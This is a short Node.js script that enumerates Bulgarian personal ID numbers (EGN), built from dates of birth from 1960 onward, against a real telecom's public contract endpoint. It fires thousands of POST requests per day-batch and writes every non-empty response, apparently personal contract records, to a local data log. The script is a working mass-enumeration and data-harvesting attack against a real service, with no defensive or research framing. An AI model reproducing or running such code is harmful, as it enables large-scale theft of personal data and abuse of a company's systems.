const fetch = require('node-fetch');
const http = require('http');
const fs = require('fs');
const util = require('util');
const log_file = fs.createWriteStream(__dirname + '/log_debug.log', {flags : 'w'});
const data_file = fs.createWriteStream(__dirname + '/log_data.log', {flags : 'w'});
const tried_file = fs.createWriteStream(__dirname + '/log_tried.log', {flags : 'w'});

const fetchDay = (year, month, day) => {
    let date = '' + year + '' + (month > 9 ? month.toString() : ('0' + month)) + (day > 9 ? day.toString() : ('0' + day));
    date = date * 10000;
    console.log('Start date: ', date)
    for(let i = 0; i < 10000; i++) {
        setTimeout(() => {
            fetch(`http://www.a1.bg/public/bbscontract/`, {
                method: 'post',
                body:    JSON.stringify({
                    pid: (date + i)
                }),
                headers: { 'Content-Type': 'application/json' },
            })
                .then(res => res.json())
                .then(body => {
                    if(body.response !== null) {
                        console.log('RES: ', body.response);
                        data_file.write(JSON.stringify(body.response) + '\n');
                    } else {
                        tried_file.write(JSON.stringify({
                            egn: date + i,
                            ...body
                        }) + '\n');
                    }
                    if(i === 9999) {
                        console.log('Finish date: ', date)
                        day++;
                        if(day > 31) {
                            month++
                            day = 1;
                        }
                        if(month > 12) {
                            month = 1;
                            year++;
                        }
                        if(year === 100) {
                            console.log('FINISH');
                            return;
                        }
                        fetchDay(year, month, day);
                    }
                }).catch(err => {
                    if(err.errorMessage === 'Невалидно ЕГН!') {
                        return;
                    }
                    log_file.write(('Failed: ' +  (date + i) + ' ERR: ' + JSON.stringify(err)) + '\n');
                });
        }, 5 * i);
    }
}

http.createServer(function (req, res) {
}).listen(24000);

console.log('started');
fetchDay(60, 1, 1);